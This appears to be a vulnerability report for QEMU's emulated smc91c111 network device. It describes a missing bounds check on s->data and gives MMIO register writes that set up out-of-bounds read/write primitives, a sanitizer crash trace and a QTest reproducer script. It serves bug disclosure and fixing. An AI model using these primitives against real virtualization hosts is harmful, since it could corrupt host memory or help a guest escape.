tag: arch: arm
tag: type: OOB read/write

# OOB read/write in hw/smc91c111

There is an OOB read/write in hw/smc91c111 because there is no bound check of
s->data[4][2048].

## Common settings
1 s->packet_num can set max to 0xff
```
// smc91c111_writefn
for (; i < size; i++) {
    smc91c111_writeb(opaque, addr + i, extract32(value, i * 8, 8));}
                                       // only 8 bits
// smc91c111_writeb
case 2: /* Packet Number Register */
	s->packet_num = value;
	return;
```
2 s->ptr can be set with any uint16 but max to 0x7ff
```
case 6: /* Pointer */
    SET_LOW(ptr, value);
    return;
case 7:
    SET_HIGH(ptr, value);
    return;
```
3 target address for read/write primitives
```
int p;
int n;

if (s->ptr & 0x8000)
else
    n = s->packet_num;
p = s->ptr & 0x07ff;
if (s->ptr & 0x4000) {
} else {
    p += (offset & 3);
}
s->data[n][p] = value;
```
Make sure that s->ptr is in [0, 0x7FF] and offset is 8.

The target write address is data + n * 2048 + p => data + s->packet_num * 2048 + s->ptr

Suppose the base address of smc81c111 is 0x10000300,
then to set the target address to s->data[255][2047], you need:

```
writel 0x1000030E 0x00000002
# set s->ptr.low
writel 0x10000306 0x000000ff
# set s->ptr.high
writel 0x10000307 0x00000007
# set s->packet_num
writel 0x10000302 0x000000ff
```
## Read/Write primitives

```
# read data[s->packet_num][s->ptr]
readl 0x10000308
# write data[s->packet_num][s->ptr]
writel 0x10000308 0xdeadbeef
```

## More technique details

### QEMU version, upstream commit/tag
c52d69e7dbaaed0ffdef8125e79218672c30161d/6.1.50

### Host and Guest
Ubuntu 18.04 docker/QTest Fuzzer

### Stack traces, crash details

```
UndefinedBehaviorSanitizer:DEADLYSIGNAL
==536==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x55efaf82bbdb (pc 0x55efab1a63fb bp 0x7ffc13baa950 sp 0x7ffc13baa8c0 T536)
==536==The signal is caused by a WRITE memory access.
    #0 0x55efab1a63fb in smc91c111_writeb /root/qemu/build-clean/../hw/net/smc91c111.c:458:31
    #1 0x55efab1a63fb in smc91c111_writefn /root/qemu/build-clean/../hw/net/smc91c111.c:669:9
    #2 0x55efab59c811 in memory_region_write_accessor /root/qemu/build-clean/../softmmu/memory.c:491:5
    #3 0x55efab59c504 in access_with_adjusted_size /root/qemu/build-clean/../softmmu/memory.c:552:18
    #4 0x55efab59c504 in memory_region_dispatch_write /root/qemu/build-clean/../softmmu/memory.c:1502:16
    #5 0x55efab71d5db in flatview_write_continue /root/qemu/build-clean/../softmmu/physmem.c:2746:23
    #6 0x55efab717e78 in flatview_write /root/qemu/build-clean/../softmmu/physmem.c:2786:14
    #7 0x55efab717b62 in address_space_write /root/qemu/build-clean/../softmmu/physmem.c:2878:18
    #8 0x55efab735631 in qtest_process_command /root/qemu/build-clean/../softmmu/qtest.c
    #9 0x55efab735631 in qtest_process_inbuf /root/qemu/build-clean/../softmmu/qtest.c:797:9
    #10 0x55efab7ad077 in fd_chr_read /root/qemu/build-clean/../chardev/char-fd.c:68:9
    #11 0x7fb124f6d3a4 in g_main_context_dispatch (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4c3a4)
    #12 0x55efaba92e11 in glib_pollfds_poll /root/qemu/build-clean/../util/main-loop.c:231:9
    #13 0x55efaba92e11 in os_host_main_loop_wait /root/qemu/build-clean/../util/main-loop.c:254:5
    #14 0x55efaba92e11 in main_loop_wait /root/qemu/build-clean/../util/main-loop.c:530:11
    #15 0x55efab58cd34 in qemu_main_loop /root/qemu/build-clean/../softmmu/runstate.c:725:9
    #16 0x55efaaf3f215 in main /root/qemu/build-clean/../softmmu/main.c:50:5
    #17 0x7fb1237c9bf6 in __libc_start_main /build/glibc-S9d2JN/glibc-2.27/csu/../csu/libc-start.c:310
    #18 0x55efaaf0efa9 in _start (/root/qemu/build-clean/qemu-system-arm+0x8bffa9)

UndefinedBehaviorSanitizer can not provide additional info.
SUMMARY: UndefinedBehaviorSanitizer: SEGV /root/qemu/build-clean/../hw/net/smc91c111.c:458:31 in smc91c111_writeb
==536==ABORTING
```

### Reproducer steps

I use QTest to reproduce this bug.
Note that QEMU should be instrumented by ASAN or UBSAN.

```
#!/bin/bash -x
export QEMU=/root/qemu/build-clean/qemu-system-arm
export BUILDROOT=./
cat << EOF | $QEMU \
-machine mainstone,accel=qtest -qtest stdio -monitor none -serial none \
-display none -nodefaults -qtest stdio
writel 0x1000030E 0x00000002
writel 0x10000306 0x000000FF
writel 0x10000307 0x00000007
writeb 0x10000302 0x000000FF
# readl 0x10000308
writeb 0x10000308 0x000000FF
EOF
```

## Contact

Let me know if I need to provide more information.
